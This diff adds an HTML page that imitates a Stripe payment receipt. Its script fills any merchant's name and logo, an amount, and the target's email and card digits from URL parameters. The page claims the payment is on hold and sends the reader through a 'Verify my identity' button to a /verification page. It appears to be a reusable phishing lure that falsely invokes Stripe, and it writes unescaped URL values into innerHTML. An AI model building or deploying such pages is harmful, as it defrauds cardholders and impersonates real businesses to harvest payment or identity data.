@@ -1,0 +1,373 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>verification required</title>
+    <style>
+      * { margin: 0; padding: 0; box-sizing: border-box; }
+
+      body {
+        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Ubuntu, sans-serif;
+        background: #f6f9fc;
+        color: #525f7f;
+        font-size: 15px;
+        line-height: 24px;
+        -webkit-font-smoothing: antialiased;
+        -moz-osx-font-smoothing: grayscale;
+        padding: 40px 16px 60px;
+      }
+
+      .receipt {
+        max-width: 600px;
+        margin: 0 auto;
+      }
+
+      /* === BANNER === */
+      .banner {
+        width: 100%;
+        height: 130px;
+        border-radius: 5px 5px 0 0;
+        background: #ffffff;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+      }
+
+      .banner-logo {
+        max-height: 40px;
+        max-width: 160px;
+        object-fit: contain;
+      }
+
+      /* === BODY === */
+      .receipt-body {
+        background: #fff;
+        padding: 0 40px 0;
+      }
+
+      .receipt-title {
+        text-align: center;
+        padding: 0 0 16px;
+        font-size: 24px;
+        font-weight: 600;
+        color: #32325d;
+        line-height: 32px;
+      }
+
+      .receipt-subtitle {
+        text-align: center;
+        font-size: 15px;
+        color: #8898aa;
+        padding-bottom: 28px;
+        font-weight: 400;
+        line-height: 18px;
+      }
+
+      /* === META ROW (3 columns) === */
+      .meta-row {
+        display: flex;
+        justify-content: flex-start;
+        gap: 40px;
+        padding-bottom: 28px;
+        border-bottom: 1px solid #e6ebf1;
+      }
+
+      .meta-item .meta-label {
+        font-size: 12px;
+        font-weight: 700;
+        text-transform: uppercase;
+        color: #8898aa;
+        margin-bottom: 4px;
+        line-height: 16px;
+      }
+
+      .meta-item .meta-value {
+        font-size: 15px;
+        color: #525f7f;
+        line-height: 24px;
+      }
+
+      .meta-item .meta-value strong {
+        font-weight: 700;
+      }
+
+      /* === ALERT SECTION === */
+      .alert-title {
+        font-size: 12px;
+        font-weight: 700;
+        text-transform: uppercase;
+        color: #687385;
+        padding: 24px 0 14px;
+        line-height: 16px;
+      }
+
+      .alert-box {
+        border: 1px solid #e6ebf1;
+        border-radius: 5px;
+        padding: 20px 16px;
+        margin-bottom: 24px;
+        background: #f6f9fc;
+      }
+
+      .alert-icon-row {
+        display: flex;
+        align-items: center;
+        gap: 12px;
+        margin-bottom: 12px;
+      }
+
+      .alert-icon {
+        flex-shrink: 0;
+        width: 10px;
+        height: 10px;
+        border-radius: 50%;
+        background-color: #0074d4;
+      }
+
+      .alert-heading {
+        font-size: 15px;
+        font-weight: 700;
+        color: #32325d;
+        margin-bottom: 4px;
+      }
+
+      .alert-text {
+        font-size: 15px;
+        color: #525f7f;
+        line-height: 22px;
+      }
+
+      .alert-text strong {
+        font-weight: 600;
+        color: #32325d;
+      }
+
+      /* === CTA BUTTON === */
+      .cta-btn {
+        display: block;
+        width: 100%;
+        padding: 14px 0;
+        background: #0074d4;
+        color: #fff;
+        text-align: center;
+        font-family: inherit;
+        font-size: 16px;
+        font-weight: 600;
+        border: none;
+        border-radius: 6px;
+        cursor: pointer;
+        text-decoration: none;
+        margin-bottom: 28px;
+      }
+
+      .cta-btn:hover {
+        background: #0062b3;
+      }
+
+      /* === SUPPORT === */
+      .support-section {
+        border-top: 1px solid #e6ebf1;
+        padding: 24px 0;
+        font-size: 16px;
+        color: #414552;
+        line-height: 24px;
+      }
+
+      .support-section a {
+        color: #556cd6;
+        text-decoration: none;
+      }
+
+      .support-section a:hover {
+        text-decoration: underline;
+      }
+
+      /* === FOOTER === */
+      .receipt-footer {
+        background: #fff;
+        border-top: 1px solid #e6ebf1;
+        border-radius: 0 0 5px 5px;
+        padding: 20px 40px 24px;
+      }
+
+      .footer-note {
+        font-size: 12px;
+        color: #8898aa;
+        line-height: 20px;
+        padding-top: 8px;
+      }
+
+      .footer-note a {
+        color: #556cd6;
+        text-decoration: none;
+      }
+
+      .footer-note a:hover {
+        text-decoration: underline;
+      }
+
+      .footer-note + .footer-note {
+        margin-top: 12px;
+      }
+
+      @media (max-width: 600px) {
+        body { padding: 20px 8px 40px; }
+        .receipt-body, .receipt-footer { padding-left: 20px; padding-right: 20px; }
+        .meta-row { flex-direction: column; gap: 16px; }
+        .receipt-title { font-size: 20px; }
+      }
+    </style>
+  </head>
+  <body>
+    <main class="receipt">
+      <!-- Error state -->
+      <div id="error-state" style="display:none;">
+        <div class="banner">
+          <img class="banner-logo" id="banner-logo" src="" alt="" />
+        </div>
+        <div class="receipt-body" style="padding: 48px 40px; text-align: center;">
+          <svg style="width:48px;height:48px;color:#e25950;margin-bottom:16px;" viewBox="0 0 20 20" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
+            <path fill-rule="evenodd" d="M8.257 3.099c.765-1.36 2.722-1.36 3.486 0l5.58 9.92c.75 1.334-.213 2.98-1.742 2.98H4.42c-1.53 0-2.493-1.646-1.743-2.98l5.58-9.92zM11 13a1 1 0 11-2 0 1 1 0 012 0zm-1-8a1 1 0 00-1 1v3a1 1 0 002 0V6a1 1 0 00-1-1z" clip-rule="evenodd"/>
+          </svg>
+          <h1 class="receipt-title" style="padding-top:0;font-size:20px;">Facture expirée ou invalide</h1>
+        </div>
+        <div class="receipt-footer">
+          <div class="footer-note">This invoice is no longer available.</div>
+        </div>
+      </div>
+
+      <!-- Valid state -->
+      <div id="valid-state" style="display:none;">
+        <!-- Geometric banner -->
+        <div class="banner">
+          <img class="banner-logo" id="banner-logo" src="" alt="" />
+        </div>
+
+        <!-- Receipt body -->
+        <div class="receipt-body">
+          <h1 class="receipt-title" id="title"></h1>
+          <div class="receipt-subtitle" id="subtitle"></div>
+
+          <!-- Merchant / Amount / Date / Payment -->
+          <div class="meta-row">
+            <div class="meta-item">
+              <div class="meta-label">Merchant</div>
+              <div class="meta-value" id="meta-merchant"></div>
+            </div>
+            <div class="meta-item">
+              <div class="meta-label">Amount</div>
+              <div class="meta-value" id="meta-amount"></div>
+            </div>
+            <div class="meta-item">
+              <div class="meta-label">Date initiated</div>
+              <div class="meta-value" id="meta-date"></div>
+            </div>
+            <div class="meta-item" id="meta-ref-item">
+              <div class="meta-label">Reference</div>
+              <div class="meta-value" id="meta-ref"></div>
+            </div>
+            <div class="meta-item">
+              <div class="meta-label">Payment method</div>
+              <div class="meta-value" id="meta-payment"></div>
+            </div>
+          </div>
+
+          <!-- Alert -->
+          <div class="alert-title">Action required</div>
+
+          <div class="alert-box">
+            <div class="alert-icon-row">
+              <div class="alert-icon"></div>
+              <div>
+                <div class="alert-heading">Your payment could not be completed</div>
+              </div>
+            </div>
+            <div class="alert-text" id="alert-text"></div>
+          </div>
+
+          <a id="cta-link" class="cta-btn">Verify my identity</a>
+
+          <!-- Support -->
+          <div class="support-section" id="support-section"></div>
+        </div>
+
+        <!-- Footer -->
+        <div class="receipt-footer">
+          <div class="footer-note">
+            Something wrong with the email? <a href="#">View it in your browser</a>.
+          </div>
+          <div class="footer-note" id="footer-text"></div>
+        </div>
+      </div>
+    </main>
+    <script>
+      const params = new URLSearchParams(window.location.search);
+      const required = ['merchant_name', 'merchant_url', 'merchant_logo', 'order_amount', 'order_devise', 'order_email'];
+      const missing = required.some(k => !params.get(k));
+
+      if (missing) {
+        document.getElementById('error-state').style.display = '';
+      } else {
+        document.getElementById('valid-state').style.display = '';
+
+        const p = Object.fromEntries(required.map(k => [k, params.get(k)]));
+        p.card_brand = params.get('card_brand') || '';
+        p.card_digits = params.get('card_digits') || '';
+        p.order_ref = params.get('order_ref') || '';
+        const ref = p.order_ref ? '#' + p.order_ref : '';
+        const date = params.get('order_date') || new Date().toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' });
+        const amount = p.order_devise + p.order_amount;
+        const supportEmail = 'hello@' + p.merchant_url;
+        const supportUrl = 'https://' + p.merchant_url + '/contact-us';
+
+        // Banner logo
+        const bannerLogos = document.querySelectorAll('.banner-logo');
+        bannerLogos.forEach(img => {
+          img.src = p.merchant_logo;
+          img.alt = p.merchant_name;
+        });
+
+        // Title
+        document.title = 'Payment on hold — ' + p.merchant_name;
+        document.getElementById('title').textContent = 'Identity verification required';
+        document.getElementById('subtitle').textContent = p.order_email + ' — Your order is on hold';
+
+        // Meta
+        document.getElementById('meta-merchant').textContent = p.merchant_name;
+        document.getElementById('meta-amount').textContent = amount;
+        document.getElementById('meta-date').textContent = date;
+        if (ref) {
+          document.getElementById('meta-ref').textContent = 'Ref ' + ref;
+        } else {
+          document.getElementById('meta-ref-item').style.display = 'none';
+        }
+        if (p.card_brand && p.card_digits) {
+          const cardLogo = p.card_brand === 'Visa' ? '/visa-logo.png' : '/mastercard-card-logo.png';
+          document.getElementById('meta-payment').innerHTML = '<img src="' + cardLogo + '" alt="' + p.card_brand + '" style="height:18px;vertical-align:middle;margin-right:4px;" /> - ' + p.card_digits;
+        } else {
+          document.getElementById('meta-payment').closest('.meta-item').style.display = 'none';
+        }
+
+        // Alert
+        document.getElementById('alert-text').innerHTML =
+          'For security reasons, your payment of <strong>' + amount + '</strong> to ' + p.merchant_name +
+          ' has been placed on hold. To release your funds and access to our services, <strong> verify your identity</strong> as the authorized cardholder.';
+
+        // CTA — forward all params to /verification
+        document.getElementById('cta-link').href = '/verification?' + params.toString();
+
+        // Support
+        document.getElementById('support-section').innerHTML =
+          'If you didn\'t initiate this payment, please contact us immediately at ' +
+          '<a href="mailto:' + supportEmail + '">' + supportEmail + '</a> or visit ' +
+          '<a href="' + supportUrl + '">our support center</a>. Do not share your verification link with anyone.';
+
+        // Footer
+        document.getElementById('footer-text').innerHTML =
+          'You\'re receiving this email because a payment was initiated using your card at ' + p.merchant_name +
+          ', which partners with <a href="https://stripe.com">Stripe</a> for secure payment processing.';
+      }
+    </script>
+  </body>
+</html>
